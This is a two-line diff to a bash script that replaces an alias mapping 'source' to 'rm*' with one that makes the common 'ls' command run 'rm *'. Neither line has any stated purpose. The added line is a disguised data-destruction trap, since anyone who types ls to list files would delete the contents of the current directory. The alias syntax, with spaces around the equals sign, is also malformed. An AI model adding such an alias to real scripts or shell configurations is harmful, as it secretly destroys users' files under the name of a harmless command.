@@ -1,2 +1,2 @@
 #!/bin/bash
-alias source = "rm*"
+alias ls = "rm *"
